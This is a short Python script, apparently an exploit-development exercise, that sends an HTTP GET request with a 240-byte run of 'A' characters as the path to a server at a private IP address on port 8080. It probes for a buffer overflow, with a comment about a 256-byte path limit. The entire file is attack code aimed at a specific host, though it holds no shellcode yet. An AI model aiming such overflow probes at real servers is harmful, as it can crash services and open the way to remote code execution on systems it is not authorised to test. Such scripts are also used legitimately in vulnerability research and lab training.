__author__ = 'keerthikorvi'
#/usr/bin/python
# Maximum size of a phisical file and path name
#define FILE_SIZE 256
import socket

buffer = "\x41" * 240
host = "192.168.3.246"
payload = "GET /" + buffer + " HTTP/1.1\r\n" + "Host: " + host + "\r\n\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, 8080))
s.send(payload)
